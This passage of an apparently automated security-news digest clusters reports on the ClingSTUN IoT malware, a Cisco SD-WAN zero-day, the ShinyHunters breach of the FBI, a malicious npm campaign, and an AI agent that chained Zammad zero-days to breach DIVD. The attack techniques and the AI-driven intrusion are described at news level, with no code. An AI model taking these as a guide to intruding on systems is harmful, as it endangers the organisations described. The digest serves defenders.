Allows Unauthenticated Arbitrary File Writes Dell CSM Flaws Enable Unauthenticated Admin Access and Root on Kubernetes Nodes GitLab Patches Critical 9.9 AI Gateway Flaw Allowing Comm
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Exchange Flaw Lets Authenticated Attackers Read Other Users' Mailboxes
  - Published: 2026-10-05T16:21:52+00:00
  - Link: https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
  - Summary: Microsoft has released out-of-band security updates to address a high-severity flaw in Microsoft Exchange Server that could allow an attacker to escalate privileges under certain conditions. The vulnerability, tracked as CVE-2026-96940, is rated 8.8 on the CVSS scoring system. "Weak authorization in Microsoft Exchange Server allows an authenticated attacker to elevate privileges over a

### Cluster 5abaf61ca8 — score 10

- Title: ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-05T14:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/clingstun-backdoor-unpatched-iot/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, web_shell_backdoor
- affected_industries: education, government
- affected_products: Ivanti
- cve_ids: CVE-2022-36553, CVE-2023-46805, CVE-2024-21887, CVE-2024-23625, CVE-2025-34035
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, web_shell_backdoor, active_exploitation
- affected_industries: government, education
- affected_products: Ivanti
- cve_ids: CVE-2022-36553, CVE-2025-34035, CVE-2024-23625, CVE-2023-46805, CVE-2024-21887
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
ClingSTUN exploits known IoT flaws and abuses public STUN servers to keep proxy access to devices
```

#### Full body

```
Infosecurity Magazine Home » News » ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes News 5 October 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A Linux proxy backdoor has been observed exploiting known, unpatched flaws in internet-facing IoT devices and abusing legitimate public STUN servers to keep compromised systems reachable as remotely controlled proxy nodes. FortiGuard Labs, which dubbed the malware ClingSTUN, said in research published on October 5 that it tracked the campaign across three periods, each with a different download server. The first lasted two days and relied on a single flaw, CVE-2022-36553 in Hytec Inter routers. In the second, the attackers switched to two vulnerability: CVE-2025-34035 in EnGenius's IoT cloud service and CVE-2024-23625 in D-Link's UPnP service. The operators then spread the malware through command injection flaws in Linear, Realtek, TP-Link, AVTECH and D-Link devices. In the third period, the attackers added more entry points, and FortiGuard's list now stands at 24 vulnerabilities, including Ivanti Connect Secure flaws CVE-2023-46805 and CVE-2024-21887 and newer bugs such as CVE-2026-36356 and CVE-2025-67038. STUN Traffic Blends With VoIP and WebRTC ClingSTUN works as a back-connect proxy . It sends STUN binding requests to public servers, 24 in the second version and 13 in the third, to discover its external address and port mappings and keep NAT bindings open, then periodically reports its group identifier and mapped ports to the same servers. Because the servers are legitimate, the traffic resembles normal VoIP and WebRTC communications. FortiGuard said how the operator obtains the mappings and pushes commands through NAT remains unverified, and warned against treating the STUN services as attacker-controlled infrastructure. The malware kills competing processes and watchdog timers, copies itself into system locations, modifies boot scripts for persistence and hides behind process information copied from the system's init process. It supports remote command execution and carries hard-coded exploits for seven more vulnerabilities, including flaws in Realtek's SDK and three DVR products, to spread itself. Read more on IoT malware: New Mirai-Based Linux Botnet 'Evooo1Bot' Turns Victims Into Proxies Defenders Weigh Containment Against Patching Louis Eichenbaum, federal CTO at ColorTokens warned. "ClingSTUN is another reminder that organizations cannot patch their way out of cyber risk." He argued for compensating controls around devices that cannot be fixed immediately, with microsegmentation to limit lateral movement. Meanwhile, John Gallagher, VP at IoT security firm Viakoo, disagreed on segmentation. "Believing that network segmentation provides security is a flawed assumption," he said, arguing instead for automated firmware remediation across multivendor IoT fleets. "Visibility alone will not save you here," he added. FortiGuard advised assessing STUN activity alongside suspicious processes, unexpected UDP connections and recurring keepalive traffic. The cybersecurity firm also urged organizations to inventory internet-facing devices, prioritize patches for actively exploited flaws and replace or isolate devices that no longer receive security updates. You may also like GoTitan Botnet and PrCtrl RAT Exploit Apache Vulnerability News 29 November 2023 MostereRAT Targets Windows Users With Stealth Tactics News 8 September 2025 Phishing Campaign Uses Havoc Framework to Control Infected Systems News 3 March 2025 Advanced ValleyRAT Campaign Hits Windows Users in China News 15 August 2024 SEO Poisoning Targets Chinese Users with Fake Software Sites News 15 September 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Frontline Education Breach Impacts K-12 School District Staff News 5 October 2026 1 Google Suspends Open-Source Bug Bounty Due t
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes
  - Published: 2026-10-05T14:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/clingstun-backdoor-unpatched-iot/
  - Summary: ClingSTUN exploits known IoT flaws and abuses public STUN servers to keep proxy access to devices

### Cluster 4e072e3956 — score 10

- Title: Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-01T14:17:00+00:00
- Link: https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, zero_day
- affected_industries: education
- cve_ids: CVE-2026-76460, CVE-2026-76504
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage, active_exploitation
- affected_industries: education
- cve_ids: CVE-2026-76504, CVE-2026-76460
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Vulnerability in Cisco Catalyst SD-WAN Manager allows an unauthenticated, remote attacker to access systems with admin privileges
```

#### Full body

```
Infosecurity Magazine Home » News » Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation News 1 October 2026 Written by Danny Palmer Contributing Writer , Infosecurity Magazine Cisco has issued an urgent security update to address a newly uncovered zero-day vulnerability in Cisco Catalyst SD-WAN Manager which has already been exploited in the wild. In a security advisory published on September 30, Cisco issued a warning about CVE-2026-76504, a vulnerability in the API session-based authentication management of Cisco Catalyst SD-WAN Manager which could allow an unauthenticated, remote attacker to access an affected system with privileges of the admin user. With a CVSS score of 9.8 the vulnerability is classed as critical. If it is not remediated immediately, it could result in widespread exploitation by malicious hackers, consequences of which could include data loss, system downtime or complete system takeover. Any Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are potentially at risk of compromise. CVE-2026-76504 Exploited in the Wild According to Cisco, CVE-2026-76504 is already under “active exploitation” and the company “strongly recommends that customers upgrade to a fixed software release to remediate this vulnerability”. There are no workarounds to remediate the vulnerability without applying the security update. The vulnerability has emerged as a result of improper handling of URI encoding in an HTTP request, which if exploited allows an unauthorised, remote attacker to bypass authentication rules via the use of a crafted HTTP request. Exploitation could allow the attacker to gain access to the API with the permissions of an administrator. With this functionality, an attacker could essentially compromise the whole network, allowing an unauthorized user to pivot throughout and alter and delete files and backups. The mitigation against CVE-2026-76504 has already been deployed to Cisco Catalyst SD-WAN Cloud Hosted environments. However, Cisco warned, “While this mitigation has been deployed and was proven successful in a test environment, customers should determine the applicability and effectiveness in their own environment and under their own use conditions.” Mitigation Advice: Audit Systems, Apply Patches In analysis of the vulnerability, Rapid7 urged organizations which use Cisco Catalyst SD-WAN Manager to upgrade to an appropriate fixed release without waiting for a regular patch cycle. “Because active exploitation has occurred, Rapid7 strongly recommends that organizations audit affected systems for compromise,” the company said in a blog post published on October 1. The US Cybersecurity Infrastructure and Security Agency (CISA) has added CVE-2026-76504 to its known exploited vulnerabilities (KEV) catalogue and recommended organizations to apply mitigations. Just last month, Cisco warned customers of about active exploitation of CVE-2026-76460 , a maximum severity flaw with a CVSS rating of 10 which affected its Cisco Identity Services Engine (ISE). You may also like CISA Warns of Exploited Critical Vulnerabilities in Cisco Identity Services Engine News 29 July 2025 Beyond Disclosure: Transforming Vulnerability Data Into Actionable Security News Feature 23 September 2024 NVD Leaves Exploited Vulnerabilities Unchecked News 23 May 2024 CISA Upgrades Vulnerability Reporting Platform with More Automation News 18 September 2026 Russian State Hackers Target Vulnerable Routers Worldwide, Joint Advisory Warns News 13 July 2026 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Frontline Education Breach Impacts K-12 School District Staff News 5 October 2026 1 Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports News 5 October 2026 2 Microsoft: AI Cuts Post-Compromise Attack Time to Minutes News 2 October 2026 3 MI5 Warns Over 100 Academics Helped China's Espionage Plans News 1 Octo
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation
  - Published: 2026-10-01T14:17:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/
  - Summary: Vulnerability in Cisco Catalyst SD-WAN Manager allows an unauthenticated, remote attacker to access systems with admin privileges

### Cluster bf173c4cea — score 10

- Title: FBI Blames Contractor’s Missed Patch for ShinyHunters Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-06T14:15:00+00:00
- Link: https://www.securityweek.com/fbi-blames-contractors-missed-patch-for-shinyhunters-breach/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Citrix, Google/Gemini
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Citrix, Google/Gemini
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The FBI has removed an Accenture contractor over a data breach that exposed personal information of thousands of bureau employees. The post FBI Blames Contractor’s Missed Patch for ShinyHunters Breach appeared first on SecurityWeek .
```

#### Full body

```
The FBI has removed an Accenture contractor over a data breach that exposed personal information of thousands of bureau employees, Reuters reported on Tuesday, citing two people familiar with the matter. The FBI has not publicly named the contractor or the organization involved. However, a senior bureau official told Reuters that its review so far points to a security patch that had not been applied by the contractor responsible for the affected system. “To date, our review has determined that the incident occurred as the result of a security failure of a platform managed by a third-party organization — after a contractor failed to implement a security patch explicitly issued to secure the platform,” FBI cyber chief Brett Leatherman said in a statement. “As such, the FBI has removed the contractor and taken all necessary steps to both mitigate any further risk and protect our workforce,” Leatherman added. According to Reuters’ sources, the system in question is Oracle’s PeopleSoft human resources platform, and the outside organization is Accenture. ShinyHunters had previously claimed it exploited PeopleSoft to break into the FBI’s job site, and Google recently warned that the threat actor had been targeting vulnerable PeopleSoft instances to steal data. Advertisement. Scroll to continue reading. Accenture did not answer questions about the contractor or the alleged patching failure. Instead, the company said in a statement that it was “proud to support the mission of the FBI and will continue to do so.” The ShinyHunters cybercrime group announced on September 22 that it had hacked FBI systems . It targeted the agency’s jobs website and allegedly obtained information on all employees, including sensitive information, some of which it leaked to the media. The attack allegedly aimed to pressure the FBI to correct or remove a report the agency published in May to warn organizations about ShinyHunters attacks. The hackers claimed the report made false allegations. Shortly after ShinyHunters announced the breach, law enforcement said it had arrested an alleged leader of the group in the Netherlands on September 15. ShinyHunters seemed defiant and urged victims to continue negotiating, threatening to leak their data unless they paid up. The arrest of another alleged ShinyHunters leader, Saif al-Din Khader (aka Rey), came to light on October 3. Rey was reportedly arrested in Jordan and has been cooperating with authorities. At the time of writing, ShinyHunters’ website is still live, but a post urging organizations to pay up has been removed. The most recent victim post is dated September 22. Related : FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Related : In Rare Move, Alleged Iranian State Hacker Extradited to US Related : Crypto Scammers Hijack Microsoft’s Official X Account Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Exploitation of Citrix NetScaler Zero-Day Hits Appliances Patched Days Earlier Crypto Scammers Hijack Microsoft’s Official X Account AI Agents Aimed SQL Injection at US and Canadian Government Sites Police Shut Down KillSec Ransomware, Identify Alleged Teen Leader Treasury Blacklists Most-Wanted ATM Malware Developer and His Network Google Launches Gemini 4 Argon With Guardrail-Free Access for Vetted Defenders Google: AI Is Changing the Pace and Profile of Vulnerability Discovery Government, Finance Orgs Targeted in Weeks-Long NetScaler Zero-Day Attacks Latest News FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Apple to Tighten Full Disk Access Controls in mac
```

#### Corroborating sources (3)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: FBI Blames Contractor’s Missed Patch for ShinyHunters Breach
  - Published: 2026-10-06T14:15:00+00:00
  - Link: https://www.securityweek.com/fbi-blames-contractors-missed-patch-for-shinyhunters-breach/
  - Summary: The FBI has removed an Accenture contractor over a data breach that exposed personal information of thousands of bureau employees. The post FBI Blames Contractor’s Missed Patch for ShinyHunters Breach appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: FBI Removes Accenture Contractor After Patch Failure Led to ShinyHunters Breach
  - Published: 2026-10-06T06:56:57+00:00
  - Link: https://thehackernews.com/2026/10/fbi-removes-accenture-contractor-after.html
  - Summary: The U.S. Federal Bureau of Investigation (FBI) has removed an Accenture contractor for their alleged role in a ShinyHunters-breach that led to the theft of personal details of thousands of bureau employees. That's according to a report from Reuters, citing two sources familiar with the matter. "To date, our review has determined that the incident occurred as the result of a security failure ​
- **Risky Business News** (practitioner_analysis)
  - Title: Srsly Risky Biz: “Rogue AI” isn’t going anywhere
  - Published: 2026-10-01T02:38:57+00:00
  - Link: https://risky.biz/SRB185/
  - Summary: Amberleigh Jack and James Wilson chat about OpenAI agents’ recent escapades into Australian government websites. OpenAI has promised to “rebuild trust with Australians” but we’re likely getting a glimpse into the new normal, here. They also discuss how the ShinyHunters hacking group has found itself on law enforcement’s target list after breaching FBI systems. The group played some stupid games and they appear to be in the “stupid prizes” stage. This episode is also available on YouTube

### Cluster 9783f575b3 — score 10

- Title: Quoting Anthropic Frontier Red Team
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-09-29T22:20:28+00:00
- Link: https://simonwillison.net/2026/Sep/29/anthropic-frontier-red-team/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, mfa_bypass, phishing_social_eng
- affected_industries: education, government, legal_professional
- affected_products: Anthropic/Claude, Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
We evaluate several models on 100 tasks from the [internal Binary Exploitation benchmark] (selected at random), and find that GLM-5.3 develops full control flow hijacks in 4% of the trials; Claude Mythos Preview did so in 6%. Although GLM-5.3 performs below Claude Mythos Preview here, a meaningful threshold has clearly been crossed: earlier models, like Claude Opus 4.6 and GLM-5.2, do not succeed in any of them. — Anthropic Frontier Red Team , GLM-5.3 and the spread of advanced cyber capabilities Tags: anthropic , generative-ai , ai-security-research , glm , ai , ai-in-china , llms
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Deepgram — Flux TTS remembers the conversation, so your agent sounds right on reply 20. Hear the demo 29th September 2026 We evaluate several models on 100 tasks from the [internal Binary Exploitation benchmark] (selected at random), and find that GLM-5.3 develops full control flow hijacks in 4% of the trials; Claude Mythos Preview did so in 6%. Although GLM-5.3 performs below Claude Mythos Preview here, a meaningful threshold has clearly been crossed: earlier models, like Claude Opus 4.6 and GLM-5.2, do not succeed in any of them. — Anthropic Frontier Red Team , GLM-5.3 and the spread of advanced cyber capabilities Posted 29th September 2026 at 10:20 pm Recent articles We're going to need default hard budget caps on pretty much everything - 3rd October 2026 OpenAI DevDay 2026 live blog - 29th September 2026 2026 in LLMs (so far) - 27th September 2026 This is a quotation collected by Simon Willison, posted on 29th September 2026 . ai 2,262 generative-ai 2,005 llms 1,972 anthropic 345 ai-in-china 109 glm 10 ai-security-research 46 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (3)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Anthropic Frontier Red Team
  - Published: 2026-09-29T22:20:28+00:00
  - Link: https://simonwillison.net/2026/Sep/29/anthropic-frontier-red-team/
  - Summary: We evaluate several models on 100 tasks from the [internal Binary Exploitation benchmark] (selected at random), and find that GLM-5.3 develops full control flow hijacks in 4% of the trials; Claude Mythos Preview did so in 6%. Although GLM-5.3 performs below Claude Mythos Preview here, a meaningful threshold has clearly been crossed: earlier models, like Claude Opus 4.6 and GLM-5.2, do not succeed in any of them. — Anthropic Frontier Red Team , GLM-5.3 and the spread of advanced cyber capabilities Tags: anthropic , generative-ai , ai-security-research , glm , ai , ai-in-china , llms
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Welcome to the Jungle: What We Found Inside 15,465 Public MCP Servers
  - Published: 2026-10-06T11:02:30+00:00
  - Link: https://thehackernews.com/2026/10/welcome-to-jungle-what-we-found-inside.html
  - Summary: In 2024, MCP (Model Context Protocol) set out to become the USB-C of AI: one standard for connecting models, agents, and IDEs to tools and data. The protocol delivered. Thousands of developers built servers, and enterprises plugged them into agent workflows. The ecosystem around it fell short. Earlier this year, our team at OX Security, traced critical vulnerabilities in Anthropic's MCP
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: What’s new with Google Cloud
  - Published: 2026-10-02T16:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - Summary: Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Sept 28 - Oct 2 Claude Sonnet 5.5 is now available on Google Cloud. Built for focused coding and knowledge work, it delivers stronger performance for feature development, and creating presentation-ready documents, while offering more intelligence with a lower cost per task for most work at faster speed. Deploy Sonnet 5.5 directly from Model Garden with Google Cloud’s enterprise security, scale, and governance built in. Try it now . Mastering Storage Management with Storage Intelligence In our new blog, explore practical strategies to modernize storage operations using Storage Intelligence Advisor and enhanced Batch

### Cluster c82a5c5007 — score 9

- Title: TTY Logs and the Data it Captures, (Sun, Oct 4th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-05T00:15:00+00:00
- Link: https://isc.sans.edu/diary/rss/33396
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
For an experiment, I created a script [ 1 ] that parses and send the TTY logs collected from actors or bots activity that run various commands after they successfully login the DShield sensor. Those TTY logs are sent daily at the end of each day to the DShield SIEM [ 2 ] to be correlated with all the data.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: TTY Logs and the Data it Captures, (Sun, Oct 4th)
  - Published: 2026-10-05T00:15:00+00:00
  - Link: https://isc.sans.edu/diary/rss/33396
  - Summary: For an experiment, I created a script [ 1 ] that parses and send the TTY logs collected from actors or bots activity that run various commands after they successfully login the DShield sensor. Those TTY logs are sent daily at the end of each day to the DShield SIEM [ 2 ] to be correlated with all the data.

### Cluster a832e5790f — score 9

- Title: AI agent exploits Zammad zero-days in DIVD breach: What we know and how to detect it
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-06T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/ai-agent-exploits-zammad-zero-days-in-divd-breach-what-we-know-and-how-to-detect-it
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- cve_ids: CVE-2026-102489, CVE-2026-102490
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- cve_ids: CVE-2026-102489, CVE-2026-102490
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
< back to blog AI agent exploits Zammad zero-days in DIVD breach: What we know and how to detect it Published by: Marcel Claassen Published by: Crystal Morin @ linkedin Published: October 6, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more This blog was originally published on October 2, 2026. This incident is currently under active investigation. The information in this blog is based on the information accessible as of the date of this blog, therefore the investigation information is likely to evolve. On September 21, 2026, an agentic threat actor (ATA) breached the Dutch Institute for Vulnerability Disclosure (DIVD) , a volunteer nonprofit that finds exposed systems on the internet and warns their owners. The ATA gained access by chaining two vulnerabilities initially classified as zero-days in the Zammad helpdesk platform, CVE-2026-102489 and CVE-2026-102490 , and went from a hijacked session to root access in seconds. According to the DIVD , the organization noticed suspicious activity, opened an investigation, and realized it had been hacked. The organization described the ATA as "loud and very, very messy," likely because AI agents are non-deterministic, choosing each action in succession at machine speed. That noise creates ample detection opportunities for security teams. Additionally, just as the Sysdig Threat Research Team (TRT) has seen from ATAs like JADEPUFFER , the AI agent behind the DIVD breach left comments in the code explaining its actions and reasoning. While this agent may have been poorly trained and configured, it was still able to move from the helpdesk software to the DIVD system and exfiltrate data. It is unclear how many confirmed Zammad users are impacted by these zero-days, but according to its website, there are over 2,000 customers and 55,000 users. This blog details what we know about how the intrusion unfolded and how security teams can detect and combat the next one, at speed, without knowing the CVE. What happened at DIVD? On October 1, 2026, DIVD confirmed that the breach led to data exfiltration. This is an ongoing investigation, and the organization’s understanding of the incident will likely continue to evolve. The timeline below comes from the case files DIVD opened for the breach and the vulnerabilities: Date Activity September 21 The attacker first gained access to DIVD systems September 22 DIVD detected the intrusion, blocked access to all systems in its data center, and started a forensic investigation with Merlon Security. September 22 to 23 DIVD analyzed and reproduced the vulnerabilities. September 24 DIVD disclosed the breach to the Dutch data protection authority and the National Cyber Security Centre. DIVD also publicly announced the breach and disclosed the vulnerabilities to Zammad. September 26 DIVD scanned for publicly exposed Zammad instances and began notifying vulnerable organizations. September 29 DIVD published the case files and the two CVE records. The vulnerabilities Zammad is a widely deployed open source helpdesk software. DIVD identified both vulnerabilities in the software while investigating the breach with Merlon Security. The vulnerabilities were not publicly disclosed prior to being used against DIVD, and were characterized as zero-days. However, Zammad says it received a report on CVE-2026-102489 in August, before the breach. CVE-2026-102489 A remote code execution (RCE) flaw affecting versions 6.3.0 to 6.5.4. It is also present in versions 7.0.0 to 7.1.3, but is not exploitable due to specific environmental conditions. DIVD said impact on versions before 6.3.0 is unknown. Zammad's advisory says exploitation is only possible on Zammad 6.5 and earlier, which are out of support and no longer receive security updates. Zammad confirmed versions 7.0 and later are not affected, and it cha
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: AI agent exploits Zammad zero-days in DIVD breach: What we know and how to detect it
  - Published: 2026-10-06T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/ai-agent-exploits-zammad-zero-days-in-divd-breach-what-we-know-and-how-to-detect-it

### Cluster 00b877b227 — score 9

- Title: Long-Running NPM Malware Campaign Accumulates 40,000 Downloads
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-06T10:34:25+00:00
- Link: https://www.securityweek.com/long-running-npm-malware-campaign-accumulates-40000-downloads/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: npm

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, supply_chain, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: critical_infrastructure, financial_services, healthcare
- affected_products: Fortinet, Microsoft SharePoint, npm
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, data_breach, web_shell_backdoor, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: healthcare, financial_services, critical_infrastructure
- affected_products: npm, Microsoft SharePoint, Fortinet
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Since August 2023, attackers have published eight malicious packages as part of the MALFEX supply chain campaign. The post Long-Running NPM Malware Campaign Accumulates 40,000 Downloads appeared first on SecurityWeek .
```

#### Full body

```
Malicious packages published as part of a long-running NPM supply chain campaign have accumulated over 40,000 downloads, Checkmarx reports. Dubbed MALFEX and distributing malware such as the Overlord RAT and infostealers, the campaign has been ongoing since August 2023, when the threat actor published its first package. To date, the threat actor has published 12 packages, eight of which are malicious. Five have been removed from the registry, but three were still installable as of October 1, namely function-flag , function-color , and cdn-img-fetch . According to Checkmarx, function-flag deserves special attention: it has been malicious since July 2025, has more than 37,000 downloads, and no advisory flags it as malicious. Open Source Vulnerabilities (OSV) advisories have been published for six malicious packages: tlxbnhd, tldriver, mxdriver, img-to-native, native-runner, and cdn-img-fetch . However, the entry for cdn-img-fetch covers only two of its four malicious iterations. Checkmarx identified three independent delivery paths used in the campaign, noting that they do not share infrastructure, although they are linked to the same threat actor. Advertisement. Scroll to continue reading. The first involves loaders for the Overlord RAT and obfuscated scripts executed during npm install . While the scripts can be launched on Windows, macOS, and Linux, the payload only works on Windows systems. The Overlord RAT provides the operator with monitoring and control capabilities, including screen capture, keylogging, window monitoring, remote shell access, file search, and a hidden desktop to perform malicious activities without detection. As part of the second path, malicious code is executed when the package is loaded, to drop the Node.js information stealer ‘movinlike’ on the victims’ machines. The malware targets eight Discord clients, seven popular browsers, and cryptocurrency wallets for data theft. The third path is the longest-running part of the campaign. It involves a separate downloader in each malicious version of function-flag, designed to fetch a payload from a different location. According to Checkmarx, the infection routine is implemented so that the package installation could complete even if the payload download fails. The routine fails silently on macOS and Linux, meaning that only Windows systems are affected. “No legitimate or widely used packages depend on any operator package, so exposure is limited to systems that installed these package names directly. We found no geographic or organizational targeting; anyone who installs the stealer becomes a target,” Checkmarx notes. Related: Linux Backdoor Abuses STUN Protocol, Exploits Dozens of Flaws Related: macOS Users Targeted by Fake Zoom Installer Carrying CloudSyncD Backdoor Related: Daemon Tools Hackers’ NeedyMantis Malware Dissected by Microsoft Related: New x47.c Windows Botnet Weaponizes xAI Grok, AI API Draining Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Exploitation Hits Rejetto HFS Vulnerability Discovered by AI Alleged ShinyHunters Leader Arrested in Jordan Fortra Patches Critical Vulnerabilities in BoKS In Rare Move, Alleged Iranian State Hacker Extradited to US Warlock Expands SharePoint Exploitation in Critical Infrastructure Attacks Exploited Fortinet FortiMail Zero-Day Calls for Urgent Action Zimbra Vulnerability Exploited in the Wild Prior to Public Disclosure Latest News FBI Blames Contractor’s Missed Patch for ShinyHunters Breach FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Apple to Tighten Full Disk Access Controls in macOS Amid AI Risks Cybersecurity M&A Roundup: 39 Deals Announced in September 2026 8.8 Million Impacted by Data Breach at Denmark’s Central P
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Long-Running NPM Malware Campaign Accumulates 40,000 Downloads
  - Published: 2026-10-06T10:34:25+00:00
  - Link: https://www.securityweek.com/long-running-npm-malware-campaign-accumulates-40000-downloads/
  - Summary: Since August 2023, attackers have published eight malicious packages as part of the MALFEX supply chain campaign. The post Long-Running NPM Malware Campaign Accumulates 40,000 Downloads appeared first on SecurityWeek .

### Cluster 0d96e73336 — score 9

- Title: Google Pauses OSS Product Bug Bounty Rewards After Surge in Invalid Automated Reports
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-06T09:21:47+00:00
- Link: https://thehackernews.com/2026/10/google-pauses-oss-product-bug-bounty.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Google has stopped accepting product vulnerability reports through its bug bounty program for its open-source software. The change, in effect since October 1, means researchers can no longer submit security flaws in the code of projects such as Go, Angular, and Protocol Buffers there for a reward. Reports about supply chain compromises are still accepted, and reports filed before October 1 are
```

#### Full body

```
